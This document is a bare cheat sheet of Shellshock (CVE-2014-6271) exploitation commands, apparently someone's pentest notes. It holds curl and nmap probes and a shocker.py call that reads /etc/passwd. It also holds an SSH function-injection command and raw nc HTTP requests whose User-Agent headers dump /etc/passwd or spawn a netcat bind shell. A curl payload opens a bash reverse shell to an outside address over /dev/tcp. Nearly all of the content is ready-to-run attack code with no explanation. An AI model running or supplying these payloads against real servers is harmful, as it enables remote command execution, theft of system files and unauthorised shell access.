curl -H 'User-Agent: () { :; }; echo "CVE-2014-6271 vulnerable" bash -c id' http://10.11.1.71/cgi-bin/admin.cgi

nmap 10.11.1.71 -p 80 \
  --script=http-shellshock \
  --script-args uri=/cgi-bin/test.cgi --script-args uri=/cgi-bin/admin.cgi

./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose

* Shellshock via SSH
ssh -vvv
ssh -i noob noob@$ip '() { :;}; /bin/bash'

* cat file (view file contents)

echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; echo \\$(</etc/passwd)\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
       
curl -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/192.168.178.102/9999 0>&1" "http://192.168.178.121:80/cgi-bin/status/"

* Shellshock run bind shell using netcat

echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80